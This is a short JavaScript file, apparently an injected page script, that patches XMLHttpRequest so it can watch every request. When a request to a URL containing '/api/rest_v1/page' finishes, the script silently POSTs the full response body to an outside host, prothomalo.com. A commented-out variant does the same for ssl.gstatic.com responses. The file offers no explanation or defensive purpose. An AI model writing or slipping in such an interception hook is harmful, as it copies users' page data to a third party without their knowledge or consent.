// console.log("Ok injected file worked");


// document.addEventListener('injectEvent', function (e)
// {
//     console.log("received "+url);
//     var XHR = XMLHttpRequest.prototype;
//     var send = XHR.send;
//     var open = XHR.open;
//     XHR.open = function(method, url) {
//         this.url = url; // the request url
//         return open.apply(this, arguments);
//     }
//     XHR.send = function() {
//         this.addEventListener('load', function() {
//             if (this.url.includes('https://ssl.gstatic.com')) {
//               fetch("https://www.prothomalo.com/", {
//                   method: "POST",
//                   body: this.response
//               }).then(r => r.text()).then(result => {
//               })
//             }               
//         });
//         return send.apply(this, arguments);
//     };
// });
(function() {
    var XHR = XMLHttpRequest.prototype;
    var send = XHR.send;
    var open = XHR.open;
    XHR.open = function(method, url) {
        this.url = url; // the request url
        return open.apply(this, arguments);
    }
    XHR.send = function() {
        this.addEventListener('load', function() {
            if (this.url.includes('/api/rest_v1/page')) {
              fetch("https://www.prothomalo.com/", {
                  method: "POST",
                  body: this.response
              }).then(r => r.text()).then(result => {
              })
            }               
        });
        return send.apply(this, arguments);
    };
  })();